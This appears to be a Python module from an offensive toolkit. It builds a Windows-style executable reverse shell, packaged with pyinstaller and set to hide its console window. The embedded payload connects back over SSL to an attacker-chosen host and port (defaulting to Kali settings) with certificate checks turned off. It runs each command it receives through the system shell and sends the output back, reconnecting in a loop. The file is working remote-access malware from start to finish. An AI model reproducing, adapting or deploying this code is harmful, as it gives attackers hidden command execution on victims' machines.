import glob
import os
import shutil
import subprocess
import tempfile

from core.logger import Logger
from core.module_interface import ModuleInterface

logger = Logger()


class PythonPayloadGenerator(ModuleInterface):
    def get_metadata(self):
        return {"name": "Python Reverse SSL Payload", "version": "2.1", "type": "generator"}

    def run(self, config):
        lhost = config.get("kali_ip", "127.0.0.1")
        lport = config.get("kali_port", 4444)

        if not shutil.which("pyinstaller"):
            logger.error("pyinstaller n'est pas installé ou introuvable dans le PATH")
            return {"status": "error", "message": "pyinstaller not found"}

        template = f'''
import socket
import ssl
import subprocess
import threading
import time


def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("{lhost}", {lport}))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ss = ctx.wrap_socket(s, server_hostname="{lhost}")

            def heartbeat():
                while True:
                    time.sleep(30)
                    try:
                        ss.send(b"ping")
                    except Exception:
                        break

            threading.Thread(target=heartbeat, daemon=True).start()

            while True:
                cmd = ss.recv(4096).decode(errors="ignore")
                if not cmd or cmd.strip().lower() == "exit":
                    break
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                out, err = proc.communicate()
                ss.send(out + err)
            ss.close()
        except Exception:
            time.sleep(5)


if __name__ == "__main__":
    connect()
'''

        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8') as f:
            f.write(template)
            py_path = f.name

        out_dir = tempfile.mkdtemp(prefix='fokarat_python_')
        final_path = None
        try:
            cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--distpath", out_dir,
                "--workpath", os.path.join(out_dir, "build"),
                "--specpath", out_dir,
                "--name", "payload_python",
                py_path,
            ]
            proc = subprocess.run(cmd, capture_output=True, text=True, check=False)
            if proc.returncode != 0:
                raise RuntimeError(proc.stderr or proc.stdout or "pyinstaller failed")

            candidates = []
            for pattern in ["payload_python.exe", "payload_python", "payload_python.bin", "payload_python-*"]:
                candidates.extend(glob.glob(os.path.join(out_dir, pattern)))
            for root, _, files in os.walk(out_dir):
                for name in files:
                    if name.startswith("payload_python") and not name.endswith((".spec", ".toc", ".pyz")):
                        candidates.append(os.path.join(root, name))

            for path in candidates:
                if os.path.isfile(path):
                    final_path = os.path.abspath(path)
                    break

            if not final_path:
                raise FileNotFoundError("Executable not generated")

            target = os.path.join(os.getcwd(), os.path.basename(final_path))
            shutil.move(final_path, target)
            final_path = target
            logger.info("Payload Python généré", output=final_path)
            return {"status": "success", "payload_path": final_path, "type": "python"}
        except Exception as e:
            logger.error("Erreur lors de la génération Python", error=str(e))
            return {"status": "error", "message": str(e)}
        finally:
            try:
                os.unlink(py_path)
            except FileNotFoundError:
                pass
            shutil.rmtree(out_dir, ignore_errors=True)


__all__ = ["PythonPayloadGenerator"]